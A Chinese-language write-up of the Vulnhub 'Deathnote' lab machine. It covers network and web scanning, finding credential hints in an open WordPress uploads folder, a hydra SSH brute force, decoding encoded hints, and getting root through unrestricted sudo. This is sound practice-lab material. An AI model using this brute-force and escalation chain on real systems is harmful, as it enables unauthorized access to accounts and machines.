# Vulnhub Deathnote


Vulnhub靶场练习 -- Deathnote

## Knowledge

- wpscan - WordPress Scanner
- hydra -- ssh username and password brute force

## 1. Environment Setup

常规设置，如果使用vmware的话就需要配置一下网络。

## 2. Reconnaisence

### 1. IP Address

arp-scan扫一下：

```shell
┌──(v4ler1an㉿kali)-[~/Documents/tmp]
└─$ sudo arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:9d:5b:9e, IPv4: 172.16.86.138
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
172.16.86.1	5e:52:30:c9:b7:65	(Unknown: locally administered)
172.16.86.2	00:50:56:fd:f8:ec	VMware, Inc.
172.16.86.145	00:0c:29:54:62:bc	VMware, Inc.
172.16.86.254	00:50:56:e8:1f:a8	VMware, Inc.

8 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.370 seconds (108.02 hosts/sec). 4 responded
```

### 2. Port Info

nmap扫下端口信息：

```shell
┌──(v4ler1an㉿kali)-[~/Documents/tmp]
└─$ nmap -T4 -A -Pn 172.16.86.145
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-09 01:23 EST
Nmap scan report for 172.16.86.145
Host is up (0.0023s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 5e:b8:ff:2d:ac:c7:e9:3c:99:2f:3b:fc:da:5c:a3:53 (RSA)
|   256 a8:f3:81:9d:0a:dc:16:9a:49:ee:bc:24:e4:65:5c:a6 (ECDSA)
|_  256 4f:20:c3:2d:19:75:5b:e8:1f:32:01:75:c2:70:9a:7e (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.73 seconds
```

开放的端口：

| port | service  |
| ---- | -------- |
| 22   | ssh      |
| 80   | http web |

22端口的登录需要账号密码，看下80端口：

```shell
┌──(v4ler1an㉿kali)-[~/Documents/tmp]
└─$ curl http://172.16.86.145/
<!DOCTYPE html>
<html>
  <head>
    <meta http-equiv="refresh" content="1; url='http://deathnote.vuln/wordpress" />
  </head>
  <body>
   <cente> <p>Please wait.....</p></center>
  </body>
</html>
```

看起来没有什么东西，但是有提示wordpress，后续可能会用得上。

### 3. Web Directory

看下其他目录：

```shell
┌──(v4ler1an㉿kali)-[~/Documents/tmp]
└─$ dirb http://172.16.86.145 -r

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Thu Nov  9 01:26:41 2023
URL_BASE: http://172.16.86.145/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
OPTION: Not Recursive

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://172.16.86.145/ ----
+ http://172.16.86.145/index.html (CODE:200|SIZE:197)
==> DIRECTORY: http://172.16.86.145/manual/
+ http://172.16.86.145/robots.txt (CODE:200|SIZE:68)
+ http://172.16.86.145/server-status (CODE:403|SIZE:278)
==> DIRECTORY: http://172.16.86.145/wordpress/

-----------------
END_TIME: Thu Nov  9 01:26:44 2023
DOWNLOADED: 4612 - FOUND: 3
```

存在几个可以直接访问的目录，看下robots,txt：

```shell
┌──(v4ler1an㉿kali)-[~/Documents/tmp]
└─$ curl http://172.16.86.145/robots.txt
fuck it my dad
added hint on /important.jpg

ryuk please delete it
```

这里给了提示，直接看下important.jpg看看能不能访问到：

```shell
┌──(v4ler1an㉿kali)-[~/Documents/tmp]
└─$ curl http://172.16.86.145/important.jpg
i am Soichiro Yagami, light's father
i have a doubt if L is true about the assumption that light is kira

i can only help you by giving something important

login username : user.txt
i don't know the password.
find it by yourself
but i think it is in the hint section of site
```

继续给了提示，说ssh的登录密码应该存放在user.txt中，密码需要我们自己找。





## 3. Exploit

上面扫描到`http://172.16.86.145/wordpress/`，这里我们用wpscan再扫描一下这个url看看：

```shell
┌──(v4ler1an㉿kali)-[~/Documents/tmp]
└─$ wpscan --url http://172.16.86.145
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.25
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________


Scan Aborted: The remote website is up, but does not seem to be running WordPress.

┌──(v4ler1an㉿kali)-[~/Documents/tmp]
└─$ wpscan --url http://172.16.86.145
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.25
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________


Scan Aborted: The remote website is up, but does not seem to be running WordPress.

┌──(v4ler1an㉿kali)-[~/Documents/tmp]
└─$ wpscan --url http://172.16.86.145
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.25
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________


Scan Aborted: The remote website is up, but does not seem to be running WordPress.

┌──(v4ler1an㉿kali)-[~/Documents/tmp]
└─$ wpscan --url http://172.16.86.145/wordpress
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.25
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://172.16.86.145/wordpress/ [172.16.86.145]
[+] Started: Thu Nov  9 01:33:59 2023

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.38 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://172.16.86.145/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://172.16.86.145/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://172.16.86.145/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://172.16.86.145/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.8 identified (Insecure, released on 2021-07-20).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://172.16.86.145/wordpress/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.8'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://172.16.86.145/wordpress/, Match: 'WordPress 5.8'

[i] The main theme could not be detected.

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <====================================================================================================> (137 / 137) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Thu Nov  9 01:34:17 2023
[+] Requests Done: 164
[+] Cached Requests: 4
[+] Data Sent: 43.419 KB
[+] Data Received: 85.812 KB
[+] Memory used: 215.035 MB
[+] Elapsed time: 00:00:17
```

版本为5.8，并且扫描到一个upload路径，还是直接访问的：

![image-20231109143630080](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311091436284.png)

在这里翻翻，可以找到一个user.txt和note.txt：

![image-20231109143754361](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311091437560.png)

内容拿下来，继续用hydra爆破一下看看：

```shell
┌──(v4ler1an㉿kali)-[~/Documents/tmp]
└─$ hydra -L user.txt -P password.txt 172.16.86.145 ssh
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-11-09 01:38:55
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 430 login tries (l:10/p:43), ~27 tries per task
[DATA] attacking ssh://172.16.86.145:22/
[STATUS] 283.00 tries/min, 283 tries in 00:01h, 148 to do in 00:01h, 15 active
[22][ssh] host: 172.16.86.145   login: l   password: death4me
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 10 final worker threads did not complete until end.
[ERROR] 10 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-11-09 01:40:28

```

比较幸运，爆破出来一个`l/death4me`，使用这个用户名密码登录ssh。

在用户目录下发现一个user.txt，内容如下：

```shell
l@deathnote:~$ id
uid=1000(l) gid=1000(l) groups=1000(l),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)
l@deathnote:~$ ls
user.txt
l@deathnote:~$ cat user.txt
++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>>+++++.<<++.>>+++++++++++.------------.+.+++++.---.<<.>>++++++++++.<<.>>--------------.++++++++.+++++.<<.>>.------------.---.<<.>>++++++++++++++.-----------.---.+++++++..<<.++++++++++++.------------.>>----------.+++++++++++++++++++.-.<<.>>+++++.----------.++++++.<<.>>++.--------.-.++++++.<<.>>------------------.+++.<<.>>----.+.++++++++++.-------.<<.>>+++++++++++++++.-----.<<.>>----.--.+++..<<.>>+.--------.<<.+++++++++++++.>>++++++.--.+++++++++.-----------------.
```

这是Brainfuck编码，直接去解码：

![image-20231109144309458](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311091443686.png)
好吧，看起来是没什么用的信息。估计要跟这个kria挂钩一下。

看看还有什么用户：

```shell
l@deathnote:~$ cd /home
l@deathnote:/home$ ls
kira  l
l@deathnote:/home$ ls kira/
kira.txt
l@deathnote:/home$ cat kira/kira.txt
cat: kira/kira.txt: Permission denied
```

还存在一个kira用户，并且有一个kira.txt，但是没有权限访问。

继续翻文件系统，在opt下发现新东西：

```shell
l@deathnote:/opt$ ls
L
l@deathnote:/opt$ cd L
l@deathnote:/opt/L$ ls
fake-notebook-rule  kira-case
l@deathnote:/opt/L$ ls -lah fake-notebook-rule/
total 16K
drwxr-xr-x 2 root root 4.0K Aug 29  2021 .
drwxr-xr-x 4 root root 4.0K Aug 29  2021 ..
-rw-r--r-- 1 root root   84 Aug 29  2021 case.wav
-rw-r--r-- 1 root root   15 Aug 29  2021 hint
l@deathnote:/opt/L$ cat fake-notebook-rule/hint
use cyberchef
l@deathnote:/opt/L$ cat fake-notebook-rule/case.wav
63 47 46 7a 63 33 64 6b 49 44 6f 67 61 32 6c 79 59 57 6c 7a 5a 58 5a 70 62 43 41 3d
```

这个还给了很明显的提示，我们直接到[cyberchef](https://gchq.github.io/CyberChef)解一下看看：

![image-20231109144959015](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311091449259.png)

先hex转码，然后进行base64解码，最后得到`passwd : kiraisevil`。接着看下opt下的另外一个文件：

```shell
l@deathnote:/opt/L$ ls
fake-notebook-rule  kira-case
l@deathnote:/opt/L$ cd kira-case/
l@deathnote:/opt/L/kira-case$ ls
case-file.txt
l@deathnote:/opt/L/kira-case$ cat case-file.txt
the FBI agent died on December 27, 2006

1 week after the investigation of the task-force member/head.
aka.....
Soichiro Yagami's family .


hmmmmmmmmm......
and according to watari ,
he died as other died after Kira targeted them .


and we also found something in
fake-notebook-rule folder .
```

好吧，应该是从这个文件到fake-notebook-rule去访问的。无所谓了。

使用上面获得的密码去登录`kria`用户:

```shell
──(v4ler1an㉿kali)-[~/Documents/tmp]
└─$ ssh kira@172.16.86.145
kira@172.16.86.145's password:
Linux deathnote 4.19.0-17-amd64 #1 SMP Debian 4.19.194-2 (2021-06-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Nov  8 23:38:03 2023 from 172.16.86.138kira@deathnote:~$ ls
kira.txt
kira@deathnote:~$ cat kira.txt
cGxlYXNlIHByb3RlY3Qgb25lIG9mIHRoZSBmb2xsb3dpbmcgCjEuIEwgKC9vcHQpCjIuIE1pc2EgKC92YXIp
kira@deathnote:~$ echo "cGxlYXNlIHByb3RlY3Qgb25lIG9mIHRoZSBmb2xsb3dpbmcgCjEuIEwgKC9vcHQpCjIuIE1pc2EgKC92YXIp"|base64 -d
please protect one of the following
1. L (/opt)
2. Misa (/var)
```

在目录下发现了kira.txt，内容base64解码后告诉我们让保护L和Misa。看下/var：

```shell
kira@deathnote:~$ cd /var
kira@deathnote:/var$ ls
backups  cache  lib  local  lock  log  mail  misa  opt  run  spool  tmp  www
kira@deathnote:/var$ cat misa
it is toooo late for misa
```

好吧，misa已经遇害了。

## 4. Privilege Escalation

`cat /etc/passwd`没有再发现其他有价值的信息。但是在检查kria权限时发现kria具有管理员权限，我们直接`sudo /bin/bash`输入kria用户的密码就可以切换到root用户：

```shell
kira@deathnote:/var$ sudo -l
Matching Defaults entries for kira on deathnote:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User kira may run the following commands on deathnote:
    (ALL : ALL) ALL
kira@deathnote:/var$ sudo /bin/bash
[sudo] password for kira:
root@deathnote:/var#
```

然后获取到root目录下的root.txt：

![image-20231109150106989](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311091501285.png)



## Notes

没有注意到在访问默认页面时会解析到deathnote,vuln域名，所以也就没有配置host解析，导致从头到尾都没有太关注wen管理端页面。但是整体看下来，也没有影响到什么。

一个完整的过程可以看下[here](https://nepcodex.com/2021/09/deathnote-writeup-vulnhub-walkthrough/)。

